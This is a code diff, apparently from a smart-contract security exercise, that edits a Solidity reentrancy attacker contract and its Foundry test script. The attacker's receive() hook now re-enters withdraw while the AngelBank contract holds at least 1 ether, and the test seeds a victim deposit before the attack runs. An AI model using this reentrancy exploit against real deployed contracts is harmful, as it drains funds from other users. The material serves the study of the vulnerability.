@@ -13,7 +13,7 @@ contract ChainReentrancy {
     }
 
     receive() external payable {
-        if (!stopAttack) {
+        if (angelBank.getTotalSupply() >= 1 ether) {
             stopAttack = true;
             angelBank.withdraw();
         }
@@ -38,11 +38,17 @@ contract ReentrancyAttackTest is Script {
     ChainReentrancy public attacker;
 
     function run() external {
-        vm.startBroadcast();
 
         angelBank = new AngelBank();
-
         attacker = new ChainReentrancy(address(angelBank));
+
+        address randomUser = address(1);
+        
+        vm.deal(randomUser, 10 ether);
+        vm.prank(randomUser);
+        angelBank.deposit{value: 5 ether}();
+        
+        vm.startBroadcast();
 
         attacker.attack{value: 1 ether}();
 
